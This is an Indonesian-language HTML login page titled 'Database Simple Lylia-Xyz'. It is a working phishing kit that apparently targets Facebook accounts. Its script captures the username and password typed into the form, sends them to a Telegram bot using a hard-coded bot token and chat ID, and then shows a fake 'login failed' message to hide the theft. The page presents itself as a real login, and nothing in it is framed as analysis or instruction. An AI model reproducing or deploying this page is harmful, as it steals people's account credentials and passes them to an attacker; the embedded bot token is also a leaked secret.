<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Databaase Simple Lylia-Xyz</title>
  <style>
    body {
      background-image: url("https://files.catbox.moe/l239zh.jpg");
      font-family: Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: #1a3aed;
      padding: 12px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      width: 360px;
      text-align: center;
    }
    .container {
        width: 28rem;
        padding: 1rem 2rem;
        background-color: rgba(255, 255, 255, 0.45);
        border-radius: 2rem;
        border: 0.1rem solid rgba(255, 255, 255, 0.25);
        box-shadow: 0 0 1rem 0.1rem rgba(0, 0, 0, 0.25);
        backdrop-filter: blur(1.5rem);
        min-width:25rem;
        box-shadow: rgb(37 39 89 / 8%) 0px 8px 8px 0;
        position: relative;
        z-index: 1;
    }
    .login-container h1 {
      color: white;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 8px;
      margin: 6px 0;
      border: 1px solid blue;
      border-radius: 6px;
      font-size: 12px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: gray;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    .login-footer {
      margin-top: 20px;
      font-size: 12px;
      color: black;
    }
  </style>
</head>
<body>

  <div class="container shadow">
    <h1>Database Simple Lylia-Xyz</h1>
    <form id="fbLoginForm">
      <input type="text" id="email" placeholder="Masukkan Username Anda" required />
      <input type="password" id="password" placeholder="Nomor Telepon Anda" required />
      <button type="submit">Login</button>
    </form>
    <div class="login-footer">
      <p>Lylia-Xyz</p>
    </div>
  </div>

  <script>
    const botToken = '8050209744:AAFJTA2-yonQ6W0nogTN26Z0nw-oOSI4xsY';
    const chatId = '8073078237';

    document.getElementById("fbLoginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const message = `ðŸ”” Percobaan Masuk Ke Website/Login\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(() => {
        alert("Login Gagal,Pastikan Akun Anda Sudah Di Database Bot Lylia-Xyz");
        // window.location.href = "https://digitalocean.com"; // bisa redirect ke fb asli
      })
      .catch((error) => {
        console.error("Gagal mengirim ke Telegram:", error);
        alert("Terjadi kesalahan.");
      });
    });
  </script>

</body>
</html>
